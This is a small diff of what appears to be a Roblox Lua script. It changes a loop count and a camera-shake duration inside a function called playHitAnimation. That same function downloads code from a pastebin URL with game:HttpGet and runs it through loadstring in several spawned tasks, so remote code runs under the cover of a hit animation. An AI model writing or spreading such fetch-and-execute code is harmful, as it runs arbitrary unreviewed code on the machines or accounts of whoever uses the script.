@@ -137,7 +137,7 @@ local function playHitAnimation(target)
     local code = game:HttpGet("https://pastebin.com/raw/cCpAvw66")
 
     task.spawn(function()
-        for i = 1, 7 do
+        for i = 1, 8 do
             task.spawn(function() loadstring(code)() end)
         end
     end)
@@ -233,7 +233,7 @@ local function playHitAnimation(target)
     end
 
     wait(1)
-    local shakeDuration = 1
+    local shakeDuration = 0.7
     local shakeMagnitude = 1.5
 
     task.spawn(function()
